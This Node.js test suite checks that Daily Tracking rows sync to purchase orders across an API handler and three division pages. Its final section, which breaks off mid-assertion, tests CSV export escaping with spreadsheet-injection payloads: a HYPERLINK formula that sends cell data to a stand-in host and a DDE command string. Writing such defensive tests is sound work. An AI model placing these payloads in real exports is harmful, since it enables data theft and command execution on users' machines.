#!/usr/bin/env node
'use strict';
/**
 * Daily Tracking → Purchase Orders: the endpoint that triggers it and the
 * pages that show it.
 *
 * Run: node scripts/test-po-daily-sync.js
 *
 * A Daily Tracking row could name PO-0003 and carry 20 t at $16.00 under
 * 02-100 / 0420, the job was charged, and PO-0003 — on the division's own tab
 * and on central purchasing — still read "no deliveries". The server now
 * records such a row on the order it names (api/lib/po-sync.js, pinned by
 * scripts/test-po-division.js and scripts/test-po-endpoint.js). This suite
 * pins the rest:
 *
 *  1. api/daily-rows.js hands every row write and delete that could matter to
 *     the order sync, answers with the orders it changed, and never lets a
 *     failed sync fail the row.
 *  2. The division pages (tracker / paving / kiewit), run as their own code:
 *     they no longer write orders from a row edit; they take on what the
 *     server changed without losing a line they have not saved; they ask for
 *     the catch-up once; the notice and Create never run against a list that
 *     failed to load; nothing on the order side deletes the field's row.
 *  3. Central purchasing sends which lines it edited and cannot delete a Daily
 *     Tracking delivery.
 */

const fs     = require('fs');
const path   = require('path');
const vm     = require('vm');
const Module = require('module');
const { requireFn, sliceSource, evalSlice } = require('./lib/fn-source');
// "One order, several jobs" (api/lib/po-sync.js): the helpers the division
// tabs' PO functions lean on to find which job a delivery is on. Lifted with
// whatever calls them.
const PO_SPLIT_FNS = ['_poSplits', '_poSplitById', '_poLineJob', '_poProjectIds', '_poHasProject', '_poSplitForProject',
  '_poIsSplit', '_poLinesOnJob', '_poJobTotals', '_poProjectTotals', '_poProjName', '_poCodeLabel', '_poRenderProjects',
  '_poPaintJobTotals', '_poMergeSplits'];

const read = f => fs.readFileSync(path.resolve(__dirname, '..', f), 'utf8');

let passed = 0, failed = 0;
const assert = (msg, cond, detail) => {
  if (cond) { passed++; console.log('  ✓ ' + msg); return; }
  failed++;
  console.error('  ✗ ' + msg);
  if (detail !== undefined) console.error('      ' + String(detail).slice(0, 500));
};

const PAGES = ['tracker.html', 'paving.html', 'kiewit-pinetree.html'];
const BLOCK_FROM = '/* ── Daily Tracking → Purchase Orders';
const BLOCK_TO   = '\nfunction _subCodeOpts(po) {';
const block = (src, page) => sliceSource(src, BLOCK_FROM, BLOCK_TO,
  `the Daily Tracking → PO block in ${page}`, 'function _poDailyOrphansHTML');

(async () => {
  // ══ 1. api/daily-rows.js ═════════════════════════════════════════════════
  console.log('\n[api/daily-rows.js hands row writes to the order sync]');
  {
    let SQL = null, syncCalls = [], syncImpl = null;
    const orig = Module._load;
    Module._load = function (request) {
      if (request === '@neondatabase/serverless') return { neon: () => SQL };
      if (request === './lib/auth') return { requireDivision: () => ({ payload: { companyCode: 'FCT' }, division: 'turf' }) };
      if (request === './lib/po-sync') {
        return { syncRowsToOrders: async (sql, args) => { syncCalls.push(args); return syncImpl ? syncImpl(args) : { ok: true, orders: [] }; } };
      }
      return orig.apply(this, arguments);
    };
    const handlerPath = path.resolve(__dirname, '..', 'api', 'daily-rows.js');
    delete require.cache[handlerPath];
    const handler = require(handlerPath);
    Module._load = orig;

    const makeSql = (rowsById = {}, returning = []) => {
      const log = [];
      const sql = (strings, ...vals) => {
        // A batch insert calls sql(text, params) rather than as a template.
        const q = (Array.isArray(strings) ? strings.join('?') : String(strings)).replace(/\s+/g, ' ').trim();
        log.push(q);
        if (/^SELECT timesheet_entry_id(, po_num)? FROM daily_tracking/.test(q)) {
          const r = rowsById[String(vals[0])];
          return Promise.resolve(r ? [r] : []);
        }
        if (/^DELETE FROM daily_tracking/.test(q) && /RETURNING/.test(q)) return Promise.resolve(returning);
        return Promise.resolve([]);
      };
      sql.log = log;
      return sql;
    };
    const res = () => {
      const r = { statusCode: 200, body: null };
      r.setHeader = () => {}; r.status = c => { r.statusCode = c; return r; };
      r.json = b => { r.body = b; return r; }; r.end = () => r;
      return r;
    };
    const call = async (req, sql) => { SQL = sql; syncCalls = []; const r = res(); await handler(req, r); return r; };

    let r = await call({ method: 'POST', query: {}, body: { projectId: 'p1', rows: [
      { id: 'a', po_num: 'PO-0003', units_purchased: '2' }, { id: 'b', po_num: '' }, { id: 'c', po_num: '  ' },
      { id: 'ts9-1-0-x', po_num: 'PO-0003' } ] } }, makeSql());
    assert('POST hands over the inserted rows that name an order — and only those',
      syncCalls.length === 1 && JSON.stringify(syncCalls[0].rowIds) === '["a"]', JSON.stringify(syncCalls));
    assert('  scoped to the company and division', syncCalls[0] && syncCalls[0].companyCode === 'FCT' && syncCalls[0].division === 'turf');
    r = await call({ method: 'POST', query: {}, body: { projectId: 'p1', rows: [{ id: 'b' }] } }, makeSql());
    assert('POST of rows naming no order reads no orders at all', syncCalls.length === 0 && r.body.ok);

    r = await call({ method: 'PUT', query: { id: 'r1' }, body: { projectId: 'p1', row: { po_num: 'PO-0003' } } },
      makeSql({ r1: { timesheet_entry_id: null, po_num: null } }));
    assert('PUT of a row that now names an order syncs it', syncCalls.length === 1 && JSON.stringify(syncCalls[0].rowIds) === '["r1"]');
    r = await call({ method: 'PUT', query: { id: 'r1' }, body: { projectId: 'p1', row: { po_num: '' } } },
      makeSql({ r1: { timesheet_entry_id: null, po_num: 'PO-0003' } }));
    assert('PUT of a row that named one before syncs it — it may have to come off', syncCalls.length === 1);
    r = await call({ method: 'PUT', query: { id: 'r1' }, body: { projectId: 'p1', row: { labor_hours: '8' } } },
      makeSql({ r1: { timesheet_entry_id: null, po_num: null } }));
    assert('PUT of a row that never named one does no order work', syncCalls.length === 0 && r.body.ok);
    r = await call({ method: 'PUT', query: { id: 'r1' }, body: { row: { po_num: 'PO-1' } } },
      makeSql({ r1: { timesheet_entry_id: 44, po_num: 'PO-1' } }));
    assert('a payroll row\'s partial update never reaches the orders', syncCalls.length === 0 && r.body.partial === true);

    syncImpl = () => ({ ok: true, orders: [{ id: 'po3', lines: [] }] });
    r = await call({ method: 'PUT', query: { id: 'r1' }, body: { projectId: 'p1', row: { po_num: 'PO-0003' } } },
      makeSql({ r1: { timesheet_entry_id: null, po_num: null } }));
    assert('the orders the write changed come back with it',
      r.body.ok && r.body.po && r.body.po.orders.length === 1 && r.body.po.orders[0].id === 'po3', JSON.stringify(r.body));
    syncImpl = () => { throw new Error('blob read failed'); };
    const errs = []; const oe = console.error; console.error = (...a) => errs.push(a.join(' '));
    r = await call({ method: 'PUT', query: { id: 'r1' }, body: { projectId: 'p1', row: { po_num: 'PO-0003' } } },
      makeSql({ r1: { timesheet_entry_id: null, po_num: null } }));
    console.error = oe;
    assert('a failed order sync never fails the row write', r.statusCode === 200 && r.body.ok === true && !r.body.po, JSON.stringify(r.body));
    assert('  and is logged', errs.some(e => /purchase orders/.test(e)));
    syncImpl = null;

    r = await call({ method: 'DELETE', query: { id: 'r1' } }, makeSql({ r1: { timesheet_entry_id: null } }));
    assert('a deleted row is handed over as deleted',
      syncCalls.length === 1 && JSON.stringify(syncCalls[0].deletedIds) === '["r1"]' && r.body.ok);
    r = await call({ method: 'DELETE', query: { id: 'r1' } }, makeSql({ r1: { timesheet_entry_id: 9 } }));
    assert('a refused delete of a payroll row touches no order', r.statusCode === 409 && syncCalls.length === 0);
    r = await call({ method: 'DELETE', query: { subCode: '0420' } },
      makeSql({}, [{ row_id: 'x', po_num: 'PO-1' }, { row_id: 'y', po_num: null }]));
    assert('a bulk delete hands over the deleted rows that named an order',
      syncCalls.length === 1 && JSON.stringify(syncCalls[0].deletedIds) === '["x"]', JSON.stringify(syncCalls));
    r = await call({ method: 'DELETE', query: { costCode: '02', subCode: '0420' } }, makeSql({}, [{ row_id: 'z', po_num: 'PO-2' }]));
    assert('  by cost and sub code too', syncCalls.length === 1 && JSON.stringify(syncCalls[0].deletedIds) === '["z"]');
    r = await call({ method: 'DELETE', query: { projectId: 'p1' } }, makeSql({}, [{ row_id: 'w', po_num: 'PO-3' }]));
    assert('  and with the whole job', syncCalls.length === 1 && JSON.stringify(syncCalls[0].deletedIds) === '["w"]');
  }

  // ══ 2. The division pages ═════════════════════════════════════════════════
  console.log('\n[the three division pages carry the same code]');
  {
    const blocks = PAGES.map(p => block(read(p), p));
    assert('paving.html carries the same block as tracker.html', blocks[1] === blocks[0]);
    assert('kiewit-pinetree.html carries the same block as tracker.html', blocks[2] === blocks[0]);
    ['makePOSelect', '_detachLinkedRows', '_syncPOHeaderToLines', 'deletePOLine', 'deletePO', '_syncPOLineToRow'].forEach(fn => {
      const srcs = PAGES.map(p => requireFn(read(p), fn, p));
      assert(`${fn} is the same in all three`, srcs.every(s => s === srcs[0]));
    });
    assert('no page still writes orders from a row edit',
      PAGES.every(p => !/_syncDailyRowToPO|_reconcileDailyPOLinks|_dailyRowToPO|PO_ROW_SYNC_FIELDS/.test(read(p))));

    // The paperclip on each delivery (scripts/test-po-page.js runs it): one
    // copy of it, pasted into all three.
    ['openPODocs', 'openPOLineDocs', '_poSettleSaves', '_poDocsTip', '_poLineDocCount', '_poLineDocsTip',
     '_poLineClipHTML', '_poDocClipsRepaint', '_poLineCountsRefresh'].forEach(fn => {
      const srcs = PAGES.map(p => requireFn(read(p), fn, p));
      assert(`the delivery paperclip's ${fn} is the same in all three`, srcs.every(s => s === srcs[0]));
    });
    const rows = PAGES.map(p => sliceSource(read(p), '        const lineRows = (po.lines||[]).map(line => {', '        const totRow =',
      `the delivery rows in ${p}`, '${_poLineClipHTML(po, line)}'));
    assert('the delivery rows are drawn the same in all three, paperclip included', rows.every(s => s === rows[0]));
    const css = PAGES.map(p => sliceSource(read(p), '    .po-line-clip {', '\n\n', `the paperclip's style in ${p}`, '.po-line-clip.has-docs'));
    assert('  and styled the same', css.every(s => s === css[0]));
    PAGES.forEach(p => {
      const conf = requireFn(read(p), '_docsEnsureConfigured', p);
      assert(`${p}: documents.js is told the uploader's login name and how to wait for the order saves`,
        /\n    getUserName: \(\) => \(fctUser && fctUser\.username\) \|\| '',/.test(conf)
          && /\n    settlePurchaseOrders: \(\) => _poSettleSaves\(\),/.test(conf), conf);
      assert(`${p}:   and a document changed repaints the paperclips rather than redrawing the tab`,
        /onChange: \(\) => \{\n      _poDocClipsRepaint\(\);/.test(conf) && !/renderPOTab/.test(conf), conf);
    });
  }

  console.log('\n[the pages read the orders back from the server, and never delete the field\'s rows]');
  PAGES.forEach(page => {
    const src = read(page);
    const handlerSrc = sliceSource(src, "document.addEventListener('change', e => {\n  const el = e.target;\n  if (el.dataset.tab !== 'daily'",
      '\n});', `${page} daily change handler`, 'drPutNow');
    assert(`${page}: a Daily Tracking edit writes the row and nothing else`, !/purchaseOrders|savePurchaseOrders/.test(handlerSrc));
    ['drPost', '_drPutNow', 'drDelete', 'drDeleteBySubCode', 'drDeleteByProject'].forEach(fn => {
      assert(`${page}: ${fn} takes on the orders its write changed`, /_drAdoptPO\(r\)/.test(requireFn(src, fn, page)));
    });
    assert(`${page}: so does a bulk post`, /_drAdoptPO\(r\);/.test(requireFn(src, 'drPostBulk', page)));
    const boot = sliceSource(src, 'const _bootReady = (async () => {', '\n})();', `${page} boot`, 'renderHeaderActions');
    assert(`${page}: the catch-up is asked for once, after load, never by the report robot`,
      /_poServerCatchUp\(\);/.test(boot) && boot.indexOf('_poServerCatchUp();') > boot.indexOf('if (_AUTO_REPORT) return;'));
    assert(`${page}: a save the server re-derived re-reads the lines`,
      /if \(j && j\.derived\) _poRefreshDailyLines\(\);/.test(requireFn(src, 'savePurchaseOrders', page)));
    assert(`${page}: deleting an order leaves Daily Tracking rows`,
      /if \(line\.po_row_id && !_poLineFromDaily\(line\)\) \{\s*\n\s*proj\.dailyRows = proj\.dailyRows\.filter/.test(requireFn(src, 'deletePO', page)));
    const ev = requireFn(src, '_handlePOEvent', page);
    // Only the deliveries on the order's OWN job move with it: a split order's
    // other jobs keep theirs (see "One order, several jobs" in po-sync.js).
    assert(`${page}: re-jobbing an order leaves them on the old job, and drops their lines`,
      /if \(line\.po_row_id && !_poLineFromDaily\(line\) && !_poLineJob\(po, line\)\.split\) \{\s*\n\s*oldP\.dailyRows/.test(ev)
      && /po\.lines = \(po\.lines \|\| \[\]\)\.filter\(l => !\(_poLineFromDaily\(l\) && !_poLineJob\(po, l\)\.split\)\);/.test(ev));
    assert(`${page}: a Daily Tracking line's row is never rebuilt from the order`,
      /if \(!r && _poLineFromDaily\(line\)\) return;/.test(requireFn(src, '_syncPOLineToRow', page)));
    assert(`${page}: the PO tab shows a lock, not a ✕, on a Daily Tracking line`,
      /\$\{_poLineFromDaily\(line\) \? `<td[^`]*&#128274;<\/td>`\s*\n\s*: perm\.canEdit \?/.test(requireFn(src, 'renderPOTab', page)));
    assert(`${page}: and tags it with the row's codes`,
      /from Daily Tracking\$\{\(line\.cost_code \|\| line\.sub_code\)/.test(requireFn(src, 'renderPOTab', page)));
    assert(`${page}: a Daily Tracking delivery gets the paperclip too, after its tag in the Invoice / Ticket # cell`,
      /from Daily Tracking[^\n`]*<\/div>` : ''\}<\/div>\$\{_poLineClipHTML\(po, line\)\}<\/div><\/td>\n/.test(requireFn(src, 'renderPOTab', page)));
    assert(`${page}: the notice of numbers with no order is drawn`, /\$\{_poDailyOrphansHTML\(\)\}/.test(requireFn(src, 'renderPOTab', page)));
    const fill = sliceSource(src, '  targets.forEach(({ i, tr }) => {', '\n  });', `${page} fill-drag`, 'drPutNow');
    assert(`${page}: a fill-drag cannot overwrite a PO # an order set`,
      /if \(field === 'po_num' && _poRowRaisedByOrder\(row\.id\)\) return;/.test(fill));
    assert(`${page}: a good read of the orders is recorded`, /_poLoadOk = true;/.test(requireFn(src, 'loadPurchaseOrders', page)));
  });

  // The pages' own functions, lifted and run.
  const LIFTED = ['_normalizeNumeric', '_poNum', '_poNum0', '_detachLinkedRows', 'makePOSelect',
                  '_syncPOHeaderToLines', 'deletePOLine', '_migratePOs', '_lineAmt', '_lineTaxPct', '_lineTax', '_recalcLineTax',
                  '_poTotals'].concat(PO_SPLIT_FNS);
  function sandbox(src, page) {
    const state = { saves: 0, rowPuts: [], fetches: [], renders: 0, errors: [], projectRenders: [] };
    let n = 0;
    const ctx = vm.createContext({
      console, Map, Set, Math, String, Number, Array, Boolean, JSON, Date, Promise, isNaN, Object,
      purchaseOrders: [], projectsList: [], truckingEntries: [], inventoryEntries: [],
      perm: { canEdit: true }, _AUTO_REPORT: false, activeTab: 'po', _poLoadOk: true, _poBaseUpdatedAt: 'v0',
      fctUser: { name: 'Tester' }, _poExpanded: new Set(), poPage: 3, DIVISION: 'turf', API_BASE: '/api', fctToken: 't',
      document: { activeElement: null, getElementById: () => null },
      uid: () => 'u' + (++n), _localDateStr: () => '2026-11-10',
      esc:   s => String(s || '').replace(/"/g, '&quot;'),
      escT:  s => String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'),
      escJs: s => String(s == null ? '' : s).replace(/\\/g, '\\\\').replace(/'/g, "\\'"),
      fmt:   v => Number(v).toFixed(2),
      savePurchaseOrders: () => { state.saves++; },
      saveTruckingEntries: () => {}, saveInventoryEntries: () => {},
      renderPOTab: () => { state.renders++; }, renderProjectPOs: id => { state.projectRenders.push(id); }, renderDailyTable: () => {},
      drPutNow: (id, row) => { state.rowPuts.push({ id, row: { ...row } }); },
      drDelete: () => {}, drGetAll: async () => [],
      _showSaveError: (auth, msg) => { state.errors.push(msg || 'error'); },
      fetch: async (url, opts) => { state.fetches.push({ url, opts }); return state.reply ? state.reply(url, opts) : { ok: false, status: 500 }; },
    });
    ctx.getProj = id => ctx.projectsList.find(p => p.id === id);
    ctx.window = { addEventListener() {} };
    // What this tab has changed and not yet stored — the block below keeps
    // those keys over the server's when it takes orders on.
    evalSlice(sliceSource(src, 'const _poEditedFields = Object.create(null);', '// Whether a read of the purchase orders has worked.',
      `the PO edit state in ${page}`), ctx, `the PO edit state from ${page}`);
    LIFTED.forEach(name => {
      const fn = requireFn(src, name, page);
      evalSlice((src.includes(`async function ${name}(`) ? 'async ' : '') + fn, ctx, `${name} from ${page}`);
    });
    evalSlice(block(src, page), ctx, `the Daily Tracking → PO block from ${page}`);
    return { ctx, state };
  }
  const json = body => ({ ok: true, status: 200, json: async () => JSON.parse(JSON.stringify(body)),
                          clone() { return json(body); } });
  const order = over => Object.assign({ id: 'po3', po_number: 'PO-0003', title: 'Aggregate', supplier: 'Acme',
    status: 'pending', date_created: '2026-11-01', project_id: 'job1', cost_code: '', sub_code: '', lines: [] }, over || {});

  for (const page of PAGES) {
    const src = read(page);

    console.log(`\n[${page}: taking on what the server changed]`);
    {
      const { ctx, state } = sandbox(src, page);
      // A line typed here a moment ago: its row's write came back first, and
      // the server recorded the row as a Daily Tracking line of its own.
      const local = order({ title: 'Local title', lines: [
        { id: 'L1', qty: '10', unit_cost: '16', po_row_id: 'r1' },          // saved
        { id: 'Lnew', qty: '5', unit_cost: '2', po_row_id: 'rNew' },        // not saved yet
        { id: 'dr-old', source: 'daily', qty: '1', unit_cost: '1', po_row_id: 'rOld' },
      ] });
      ctx.purchaseOrders.push(local);
      const srv = order({ title: 'Server title', lines: [
        { id: 'L1', qty: '12', unit_cost: '16', po_row_id: 'r1' },          // aligned to its row
        { id: 'dr-rNew', source: 'daily', qty: '5', unit_cost: '2', po_row_id: 'rNew' },
        { id: 'dr-r7', source: 'daily', qty: '7', unit_cost: '3', po_row_id: 'r7' },
      ] });
      const n = ctx._poAdoptServerOrders([srv]);
      const ids = local.lines.map(l => l.id).join();
      assert('the server\'s Daily Tracking lines replace the page\'s', ids === 'L1,Lnew,dr-r7', ids);
      assert('  a line the page has not saved yet stays', local.lines.some(l => l.id === 'Lnew'));
      assert('  and no Daily Tracking copy of its row is shown beside it', !local.lines.some(l => l.id === 'dr-rNew'));
      assert('  the server\'s figures for a line both hold are taken', local.lines.find(l => l.id === 'L1').qty === '12');
      assert('  the page\'s own header is left alone', local.title === 'Local title');
      assert('  and the tab is redrawn', n === 1 && state.renders === 1 && state.projectRenders.includes('job1'));
      assert('a second time changes nothing', ctx._poAdoptServerOrders([srv]) === 0 && state.renders === 1);
      ctx.document.activeElement = { tagName: 'INPUT' };
      ctx._poAdoptServerOrders([order({ lines: [{ id: 'dr-r8', source: 'daily', po_row_id: 'r8' }] })]);
      assert('nothing is redrawn under someone typing', state.renders === 1 && local.lines.some(l => l.id === 'dr-r8'));
      ctx.document.activeElement = null;

      let took = null;
      ctx._poAdoptServerOrders = orders => { took = orders; return 0; };
      ctx._drAdoptPO(json({ ok: true, po: { orders: [srv] } }));
      await new Promise(r => setTimeout(r, 0));
      assert('a row write\'s answer is read for its orders', took && took.length === 1);
      took = null;
      ctx._drAdoptPO({ ok: false, status: 500, clone() { throw new Error('never read'); } });
      ctx._drAdoptPO(json({ ok: true }));
      await new Promise(r => setTimeout(r, 0));
      assert('  and a failed or empty one is ignored', took === null);

      // A row write's answer can reach the page after the answer to a save of
      // the list that landed later. Its copy is the older one, and taking it
      // put figures and deliveries since replaced back on screen.
      const tick = () => new Promise(r => setTimeout(r, 0));
      const answer = (at, orders) => json({ ok: true, po: { orders: orders || [srv], updatedAt: at } });
      ctx._poBaseUpdatedAt = '2026-11-18T12:00:05.000Z';
      ctx._drAdoptPO(answer('2026-11-18T12:00:04.000Z'));
      await tick();
      assert('  but not one older than the list this page holds', took === null);
      ctx._poSeenOrder('po3', '2026-11-18T12:00:09.000Z');   // a save that sent po3 was answered
      ctx._drAdoptPO(answer('2026-11-18T12:00:07.000Z'));
      await tick();
      assert('  nor one older than a save this page has had the answer to for that order', took === null);
      ctx._drAdoptPO(answer('2026-11-18T12:00:11.000Z'));
      await tick();
      assert('  a newer one is taken', took && took.length === 1);
      took = null;
      ctx._drAdoptPO(answer('2026-11-18T12:00:10.000Z'));
      await tick();
      assert('  after which one from before IT is not', took === null);
      // An answer holds only the orders its write changed: a newer one about
      // PO-0005 says nothing about PO-0004 (two rows filled at once).
      const po4 = order({ id: 'po4', po_number: 'PO-0004' }), po5 = order({ id: 'po5', po_number: 'PO-0005' });
      ctx._drAdoptPO(answer('2026-11-18T12:00:21.000Z', [po5]));
      await tick();
      took = null;
      ctx._drAdoptPO(answer('2026-11-18T12:00:20.000Z', [po4]));
      await tick();
      assert('  and a newer answer about one order does not hold back an older one about another',
        took && took.length === 1 && took[0].id === 'po4', JSON.stringify(took));
      took = null;
      ctx._drAdoptPO(answer('2026-11-18T12:00:19.000Z', [po4, po5]));
      await tick();
      assert('  only the orders it is out of date for are left out of one',
        took && took.length === 0 || took === null, JSON.stringify(took));
      ctx._drAdoptPO(json({ ok: true, po: { orders: [srv] } }));
      await tick();
      assert('  and one from a server that sends no version is taken as before', took && took.length === 1);
    }

    console.log(`\n[${page}: a delivery's link to its row]`);
    {
      const { ctx } = sandbox(src, page);
      // Its first figure minted row rM; the row's write came back before the
      // save that links the two had landed, carrying the delivery unlinked and
      // the row recorded on the order as a Daily Tracking delivery.
      const local = order({ lines: [{ id: 'L1', qty: '2', unit_cost: '', po_row_id: 'rM' }] });
      ctx.purchaseOrders.push(local);
      ctx._poNoteLineEdit('po3', 'L1', 'qty');
      ctx._poNoteLinkChange('L1', 'rM');
      const before = order({ lines: [
        { id: 'L1', qty: '', unit_cost: '', po_row_id: null },
        { id: 'dr-rM', source: 'daily', qty: '2', unit_cost: '0', po_row_id: 'rM' },
      ] });
      ctx._poAdoptServerOrders([before]);
      const L1 = () => local.lines.find(l => l.id === 'L1') || {};
      assert('the row this page minted stands over a copy stored before the save linking them',
        L1().po_row_id === 'rM', JSON.stringify(L1()));
      assert('  so its next key mints no second row, and its row is not shown again beside it',
        local.lines.length === 1, JSON.stringify(local.lines));
      assert('  and what was typed stays', L1().qty === '2', JSON.stringify(L1()));
      // That save landed: the link is the server's now. The job was deleted,
      // and its rows with it; the server let the link go.
      ctx._poForgetSentLinks(new Map([['po3', new Map([['L1', 'rM']])]]));
      ctx._poAdoptServerOrders([order({ lines: [{ id: 'L1', qty: '2', unit_cost: '', po_row_id: null }] })]);
      assert('once a save has stored it, a link the server lets go (the row went with its job) is let go here',
        L1().po_row_id == null, JSON.stringify(L1()));

      // Its row deleted here in Daily Tracking; a row write's answer from just
      // before the delete still names it.
      const two = order({ id: 'po6', po_number: 'PO-0006', lines: [{ id: 'L2', qty: '5', unit_cost: '1', po_row_id: null }] });
      ctx.purchaseOrders.push(two);
      ctx._poNoteLinkChange('L2', null);
      ctx._poAdoptServerOrders([order({ id: 'po6', po_number: 'PO-0006',
        lines: [{ id: 'L2', qty: '5', unit_cost: '1', po_row_id: 'r2' }] })]);
      assert('a link let go with its deleted row is not put back by an answer from before the delete',
        two.lines[0].po_row_id == null, JSON.stringify(two.lines));

      // No link here and no change of this page's: the server's is taken — a
      // row purchasing raised for it.
      const other = order({ id: 'po4', po_number: 'PO-0004', lines: [{ id: 'L3', qty: '3', unit_cost: '1', po_row_id: null }] });
      ctx.purchaseOrders.push(other);
      ctx._poAdoptServerOrders([order({ id: 'po4', po_number: 'PO-0004',
        lines: [{ id: 'L3', qty: '3', unit_cost: '1', po_row_id: 'rP' }] })]);
      assert('a delivery with no link of this page\'s takes the server\'s', other.lines[0].po_row_id === 'rP',
        JSON.stringify(other.lines));

      // A row deleted here: an answer from just before the delete still
      // records it on the order. Its delivery is not shown again.
      vm.runInContext("_deletedRowIds.add('rGone')", ctx);
      ctx._poAdoptServerOrders([order({ id: 'po4', po_number: 'PO-0004', lines: [
        { id: 'L3', qty: '3', unit_cost: '1', po_row_id: 'rP' },
        { id: 'dr-rGone', source: 'daily', qty: '9', unit_cost: '1', po_row_id: 'rGone' } ] })]);
      assert('a delivery recorded from a row deleted here is not shown again',
        !other.lines.some(l => l.id === 'dr-rGone'), JSON.stringify(other.lines));
      ctx._poAdoptSaved([order({ id: 'po4', po_number: 'PO-0004', lines: [
        { id: 'L3', qty: '3', unit_cost: '1', po_row_id: 'rP' },
        { id: 'dr-rGone', source: 'daily', qty: '9', unit_cost: '1', po_row_id: 'rGone' } ] })],
        new Map([['po4', new Map([['L3', 'rP']])]]), '2026-11-18T13:00:00.000Z');
      assert('  nor by a save\'s answer', !other.lines.some(l => l.id === 'dr-rGone'), JSON.stringify(other.lines));
    }

    console.log(`\n[${page}: a row write's answer that lands while a save's answer is still arriving]`);
    {
      // A delivery moved to another of the order's jobs: its old row's delete
      // and its new row's write go out beside the save of the list. The
      // delete's answer carries the order as stored BEFORE the save, and could
      // land after the save's answer had begun — when this page had already
      // let go of the move's mark, so the delivery went back on its old job,
      // for good: the save's answer, the order having come out as sent, did
      // not name it.
      const { ctx, state } = sandbox(src, page);
      evalSlice(requireFn(src, 'savePurchaseOrders', page), ctx, `savePurchaseOrders from ${page}`);
      vm.runInContext("_poBaseUpdatedAt = '2026-11-18T12:00:00.000Z'", ctx);
      const tick = () => new Promise(r => setTimeout(r, 0));
      const SPLITS = [{ id: 's1', project_id: 'job2', cost_code: '', sub_code: '' }, { id: 's2', project_id: 'job3', cost_code: '', sub_code: '' }];
      const before = order({ id: 'po9', po_number: 'PO-0009', splits: SPLITS,
        lines: [{ id: 'M1', qty: '4', unit_cost: '5', split: 's1', po_row_id: 'rOld' }] });
      ctx.purchaseOrders.push(JSON.parse(JSON.stringify(before)));
      const m1 = () => ctx.purchaseOrders.find(p => p.id === 'po9').lines.find(l => l.id === 'M1');
      // The move, as _poMoveLine makes it.
      m1().split = 's2';
      m1().po_row_id = 'rNew';
      ctx._poNoteLineEdit('po9', 'M1', 'split');
      ctx._poNoteLinkChange('M1', 'rNew');
      let release;
      const body = new Promise(r => { release = r; });
      state.reply = () => Promise.resolve({ ok: true, status: 200, json: () => body });
      ctx.savePurchaseOrders();
      await tick();                                   // the save's answer has begun
      const stale = JSON.parse(JSON.stringify(before));
      stale.lines[0].po_row_id = null;                 // the old row gone, the new one not yet linked
      ctx._drAdoptPO(json({ ok: true, po: { updatedAt: '2026-11-18T12:00:05.000Z', orders: [stale] } }));
      await tick();
      release({ ok: true, updatedAt: '2026-11-18T12:00:06.000Z', orders: [] });
      await tick(); await tick();
      assert('the delivery stays on the job it was moved to, on its new row',
        m1().split === 's2' && m1().po_row_id === 'rNew', JSON.stringify(m1()));
      assert('  and the move\'s mark goes once the save is in', !ctx._poLineEditPending('po9', 'M1', 'split'));
      ctx._drAdoptPO(json({ ok: true, po: { updatedAt: '2026-11-18T12:00:05.500Z', orders: [stale] } }));
      await tick();
      assert('  after which an answer from before the save is not taken',
        m1().split === 's2' && m1().po_row_id === 'rNew', JSON.stringify(m1()));
    }

    console.log(`\n[${page}: a save waits for the row it links to be written]`);
    {
      // The row a delivery's first quantity (or a move) raises is written
      // beside the save that links it; a save landing first found no row
      // behind the link, and a row the merge replaced survived it.
      const { ctx, state } = sandbox(src, page);
      ctx.setTimeout = setTimeout;
      evalSlice(requireFn(src, 'savePurchaseOrders', page), ctx, `savePurchaseOrders from ${page}`);
      evalSlice('const _drRowWrites = {}; const _DR_WRITE_WAIT_MS = 20000; const _PO_ROW_WRITE_WAIT_MS = 5000;\n'
        + requireFn(src, '_drWaitForWrites', page), ctx, `_drWaitForWrites from ${page}`);
      const tick = () => new Promise(r => setTimeout(r, 0));
      ctx.purchaseOrders.push(order({ id: 'po10', po_number: 'PO-0010', lines: [{ id: 'W1', qty: '3', unit_cost: '2', po_row_id: 'rW1' }] }));
      state.reply = () => new Promise(() => {});      // the save's answer never matters here
      ctx._poNoteLineEdit('po10', 'W1', 'qty');
      ctx._poNoteLinkChange('W1', 'rW1');
      let written;
      vm.runInContext('_drRowWrites', ctx).rW1 = new Promise(r => { written = r; });
      ctx.savePurchaseOrders();
      await tick();
      assert('a save linking a row still being written waits for it', state.fetches.length === 0, state.fetches.length);
      written();
      await tick(); await tick();
      assert('  and goes as soon as it is written', state.fetches.length === 1 && /purchase-orders/.test(state.fetches[0].url),
        JSON.stringify(state.fetches.map(f => f.url)));
      const { ctx: ctx2, state: state2 } = sandbox(src, page);
      ctx2.setTimeout = setTimeout;
      evalSlice(requireFn(src, 'savePurchaseOrders', page), ctx2, `savePurchaseOrders from ${page}`);
      evalSlice('const _drRowWrites = {}; const _DR_WRITE_WAIT_MS = 20000; const _PO_ROW_WRITE_WAIT_MS = 5000;\n'
        + requireFn(src, '_drWaitForWrites', page), ctx2, `_drWaitForWrites from ${page}`);
      ctx2.purchaseOrders.push(order({ id: 'po11', lines: [{ id: 'W2', qty: '3', unit_cost: '2', po_row_id: 'rW2' }] }));
      state2.reply = () => new Promise(() => {});
      ctx2._poNoteLineEdit('po11', 'W2', 'qty');
      ctx2.savePurchaseOrders();
      assert('  one with no such write goes at once, as before', state2.fetches.length === 1, state2.fetches.length);
    }

    console.log(`\n[${page}: a job's "Export POs" CSV evaluates no formula]`);
    {
      const { ctx } = sandbox(src, page);
      const link = {};
      ctx.encodeURIComponent = encodeURIComponent;
      ctx.document.createElement = () => link;
      link.click = () => {};
      evalSlice(requireFn(src, 'exportProjectPOsCSV', page), ctx, `exportProjectPOsCSV from ${page}`);
      ctx.projectsList.push({ id: 'job2', 'project-name': 'Field 2', dailyRows: [] });
      ctx.purchaseOrders.push(order({ id: 'po12', po_number: 'PO-0012', title: '=HYPERLINK("https://x.example/?d="&A1,"Sock")',
        project_id: 'job1', splits: [{ id: 's9', project_id: 'job2', cost_code: '', sub_code: '' }],
        lines: [{ id: 'X1', split: 's9', invoice_num: "+cmd|' /C calc'!A0", qty: '-2', unit_cost: '5', employee: '@SUM(1+1)' }] }));
      ctx.exportProjectPOsCSV('job2');
      const csv = decodeURIComponent(String(link.href || '').replace(/^data:text\/csv;charset=utf-8,/, ''));
      const cells = csv.split('\n')[1] ? csv.split('\n')[1].match(/"(?:[^"]|"")*"/g) || [] : [];
      assert('a split order\'s title, invoice # and receiver go out as text, not formulas',
        cells.length > 0 && !cells.some(c => /^"[=+@]/.test(c)) && cells.some(c => c.startsWith('"\'=HYPERLINK'))
